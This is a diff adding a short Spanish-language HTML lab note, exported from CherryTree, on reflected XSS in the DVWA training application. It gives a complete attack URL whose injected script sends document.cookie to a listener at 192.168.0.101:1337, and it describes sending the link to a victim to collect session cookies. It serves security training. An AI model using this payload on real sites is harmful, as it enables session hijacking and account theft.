@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>XSS (Reflect)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>XSS (Reflect)</h1><br/><p>Buscamos lo mismo que en el anterior, fishing.</p><p></p><p>por lo que primero que vemos es un lugar para poner nuestro nombre y al ponerlo notamos que el URL cambia</p><p><img src="images/8-1.png" alt="images/8-1.png" /></p><p></p><p>por lo que probamos si realmente funciona el mismo metodo que se uso en el anterior</p><p><img src="images/8-2.png" alt="images/8-2.png" /></p><p></p><p>al ver que sirve haremos exactamente lo mismo que en XSS(DOM) usando el siguiente URL:</p><p></p><p>http://192.168.0.101/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;window.location=&#39;<a href="http://192.168.0.101:1337/?cookie='">http://192.168.0.101:1337/?cookie=&#39;</a> + document.cookie &lt;/script&gt;</p><p> </p><p> se envia este link y nos dan las cookies en el python server desde la shell</p></div>
+</body>
+</html>
